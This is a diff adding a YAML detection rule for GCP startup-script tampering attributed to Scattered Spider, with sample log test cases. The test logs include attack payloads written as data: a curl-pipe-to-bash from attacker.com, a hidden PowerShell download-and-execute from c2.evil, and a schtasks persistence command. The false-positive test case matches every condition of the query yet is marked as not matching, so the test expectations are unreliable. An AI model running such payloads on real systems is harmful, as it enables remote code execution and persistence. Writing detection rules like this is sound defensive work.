@@ -1,0 +1,137 @@
+name: Scattered Spider - GCP Compute Startup Script Modification
+description: Detects attempts by Scattered Spider to modify GCP compute instance or
+  project-wide startup scripts. Adversaries can use startup scripts for persistence,
+  ensuring malicious code executes upon instance boot or reboot.
+type: query
+query: event.category:api AND cloud.provider:gcp AND event.outcome:success AND event.action:(compute.instances.setMetadata
+  OR compute.project.setCommonInstanceMetadata) AND gcp.audit.request.metadata.key:startup-script
+language: lucene
+index:
+- logs-*
+- gcp.auditlog-*
+filters: []
+risk_score: 80
+severity: high
+threat:
+- framework: MITRE ATT&CK
+  tactic:
+    id: TA0003
+    name: Persistence
+    reference: https://attack.mitre.org/tactics/TA0003/
+  technique:
+  - id: T1053.007
+    name: Cloud Instance Startup Script
+    reference: https://attack.mitre.org/techniques/T1053/007/
+references:
+- https://attack.mitre.org/techniques/T1053/007/
+- https://www.elastic.co/guide/en/ecs/current/ecs-cloud.html
+- https://cloud.google.com/compute/docs/instances/startup-scripts
+author:
+- Detection Agent
+false_positives:
+- Legitimate administrators setting or updating startup scripts for instance configuration,
+  application deployment, or automation. Requires context and correlation with approved
+  changes.
+note: '## Triage
+
+  Investigate: the user account modifying the startup script, the content of the script
+  (if available in logs), and the target instance/project. Verify if the action was
+  authorized and expected.'
+test_cases:
+- type: TP
+  description: Successful modification of instance startup script
+  log_entry:
+    event:
+      category: api
+      action: compute.instances.setMetadata
+      outcome: success
+    cloud:
+      provider: gcp
+    user:
+      name: malicious-user@example.com
+    gcp:
+      audit:
+        request:
+          metadata:
+            key: startup-script
+            value: '#!/bin/bash\ncurl http://attacker.com/malware.sh | bash'
+    '@timestamp': '2024-03-12T23:10:00Z'
+  expected_match: true
+  evasion_technique: null
+- type: TP
+  description: Successful modification of project-wide startup script
+  log_entry:
+    event:
+      category: api
+      action: compute.project.setCommonInstanceMetadata
+      outcome: success
+    cloud:
+      provider: gcp
+    user:
+      name: compromised-admin@example.com
+    gcp:
+      audit:
+        request:
+          metadata:
+            key: startup-script
+            value: powershell.exe -nop -w hidden -c IEX (New-Object System.Net.WebClient).DownloadString('http://c2.evil/script.ps1')
+    '@timestamp': '2024-03-12T23:10:15Z'
+  expected_match: true
+  evasion_technique: null
+- type: FN
+  description: Scheduled task created within the OS (not via GCP API startup script)
+  log_entry:
+    event:
+      category: process
+      type: start
+    cloud:
+      provider: gcp
+    user:
+      name: root
+    process:
+      name: schtasks.exe
+      command_line: schtasks /create /tn "MaliciousTask" /tr "C:\malware.exe" /sc
+        ONLOGON
+    '@timestamp': '2024-03-12T23:11:00Z'
+  expected_match: false
+  evasion_technique: Persistence achieved by creating a scheduled task directly within
+    the operating system, bypassing GCP API metadata changes.
+- type: FP
+  description: Legitimate admin setting a new startup script for instance initialization
+  log_entry:
+    event:
+      category: api
+      action: compute.instances.setMetadata
+      outcome: success
+    cloud:
+      provider: gcp
+    user:
+      name: devops-engineer@example.com
+    gcp:
+      audit:
+        request:
+          metadata:
+            key: startup-script
+            value: '#!/bin/bash\napt update && apt upgrade -y'
+    '@timestamp': '2024-03-14T11:00:00Z'
+  expected_match: false
+  evasion_technique: null
+- type: TN
+  description: Normal GCP API call (disk resize)
+  log_entry:
+    event:
+      category: api
+      action: compute.disks.resize
+      outcome: success
+    cloud:
+      provider: gcp
+    user:
+      name: ops-user@example.com
+    gcp:
+      audit:
+        resource:
+          type: compute.googleapis.com/Disk
+          name: data-disk-01
+    '@timestamp': '2024-03-14T11:05:00Z'
+  expected_match: false
+  evasion_technique: null
